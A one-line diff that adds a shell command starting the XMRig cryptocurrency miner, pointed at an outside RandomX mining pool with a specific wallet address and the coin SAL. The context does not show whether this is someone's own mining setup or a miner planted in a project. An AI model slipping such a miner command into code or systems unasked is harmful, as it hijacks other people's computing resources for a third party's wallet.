@@ -1,0 +1,1 @@
+./xmrig -a rx/0 --url randomx.rplant.xyz:7130 --user SaLvs8MuTx7ijXGSG4JJhoFurRnYu1VPBbJdEwRDZXWBM46iugTVtXcTKhhXg9ZD3ugs1R51qJnm3gmJKZKpvrvQgctjMNq4Pxu.ALL --pass start=100000 --coin SAL
